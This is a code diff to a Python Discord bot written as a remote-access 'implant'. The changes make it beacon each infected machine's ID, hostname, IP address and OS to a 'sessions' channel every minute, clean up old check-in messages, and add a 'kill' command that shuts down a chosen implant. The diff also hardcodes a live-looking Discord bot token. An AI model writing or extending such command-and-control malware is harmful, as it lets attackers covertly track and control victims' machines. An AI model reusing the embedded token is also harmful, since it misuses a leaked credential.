@@ -3,11 +3,15 @@ import uuid
 import socket
 import os
 import discord
+import sys
+import asyncio
 from discord.ext import commands
 from subprocess import check_output
+from datetime import datetime, timedelta
 
 # constants
 target_channel_name = "general"
+sessions_channel_name = "sessions"
 max_msg_size = 2000
 cmd_prefix = '>'
 
@@ -19,20 +23,20 @@ bot = commands.Bot(command_prefix=cmd_prefix, intents=intents)
 # store instance of Implant
 global implant
 
-# keep track of stuff
+# keep track of implant stuff
 class Implant:
 	def __init__(self):
-		self.channel = self.get_channel()
+		self.channel = self.get_channel(target_channel_name)
 		self.uuid = self.get_uuid()
 		self.id = self.uuid
 		self.hostname = self.get_hostname()
 		self.ip = self.get_ip()
 		self.os = self.get_os()
 
-	def get_channel(self):
+	def get_channel(self, channel_name):
 		for guild in bot.guilds:
 			for channel in guild.text_channels:
-				if channel.name == target_channel_name:
+				if channel.name == channel_name:
 					return bot.get_channel(channel.id)
 	
 	def get_uuid(self):
@@ -108,6 +112,32 @@ async def on_ready():
 	msg += f'| OS: `{implant.os}`\n'
 	msg += f'--------------------------------------------------'
 	await implant.channel.send(msg)
+	
+	sessions_channel = implant.get_channel(sessions_channel_name)
+	while(True):
+		# two minutes ago
+		after = datetime.now()-timedelta(minutes=2)
+
+		log_msg(f'{after}')
+
+		# delete any old messages
+		messages_old = [message async for message in sessions_channel.history(limit=100, after=after)]
+		#log_msg(f'[out of loop] {messages_old}')
+		for message in messages_old:
+			#log_msg(f'[in loop] {message}')
+			await message.delete()
+
+		# find duplicate of self and remove
+		messages = [message async for message in sessions_channel.history(limit=100)]
+		for message in messages:
+			if implant.id in message.content:
+				await message.delete()
+
+		# post new message
+		await sessions_channel.send(f'ID: `{implant.id}` | HN: `{implant.hostname}` | IP: `{implant.ip}` | OS: `{implant.os}`')
+
+		await asyncio.sleep(60)
+	
 
 @bot.event
 async def on_message(message):
@@ -216,5 +246,13 @@ async def sessions(ctx):
 	'''
 
 	await reply_thread(ctx, f'ID: `{implant.id}` | HN: `{implant.hostname}` | IP: `{implant.ip}` | OS: `{implant.os[0]}`')
+
+@bot.command()
+async def kill(ctx, arg):
+	if not arg == implant.id:
+		return
+	
+	await ctx.message.add_reaction('💀')
+	sys.exit()
 
 bot.run("MTI3NTgyNTA2MTM3ODY1ODM2Nw.G1e8mP.3hhbRTZ6dpz8oefx5bxB9MOtBbA4KB2a6-TBHs")
